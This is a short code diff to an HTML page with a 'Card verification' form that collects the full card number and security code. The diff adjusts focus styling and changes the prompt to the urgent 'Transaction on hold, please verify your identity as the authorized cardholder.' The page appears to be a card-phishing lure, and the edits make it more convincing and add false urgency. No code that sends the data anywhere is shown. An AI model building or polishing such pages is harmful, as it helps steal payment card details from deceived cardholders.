@@ -152,7 +152,7 @@
       .panel-right {
         flex: 1;
         background: #fff;
-        padding: 108px 48px 48px 48px;
+        padding: 100px 48px 48px 48px;
         display: flex;
         justify-content: flex-start;
       }
@@ -320,6 +320,12 @@
 
       .card-verify-half .text-input:focus {
         box-shadow: none;
+        outline: none;
+      }
+
+      .card-verify-group:focus-within {
+        border-color: #0074d4;
+        box-shadow: 0 0 0 1px #0074d4;
       }
 
       .cvc-hint {
@@ -458,7 +464,7 @@
             </div>
 
             <div class="verify-desc">
-              To complete your payment, please verify your identity as the authorized cardholder.
+              Transaction on hold, please verify your identity as the authorized cardholder.
             </div>
 
             <!-- Payment recap -->
@@ -519,7 +525,7 @@
               <label class="form-label">Card verification</label>
               <div class="card-verify-group">
                 <div class="card-verify-row">
-                  <input type="text" id="cardNumber" class="text-input" style="border:none;border-radius:0;padding:0;height:100%;background:transparent;letter-spacing:0.5px;flex:1;" placeholder="•••• •••• •••• ••••" maxlength="19" />
+                  <input type="text" id="cardNumber" class="text-input" style="border:none;border-radius:0;padding:0;height:100%;background:transparent;letter-spacing:0.5px;flex:1;box-shadow:none;outline:none;" placeholder="•••• •••• •••• ••••" maxlength="19" />
                   <span class="card-brand-icon" id="card-brand-icon"></span>
                 </div>
                 <div class="card-verify-split card-verify-row">
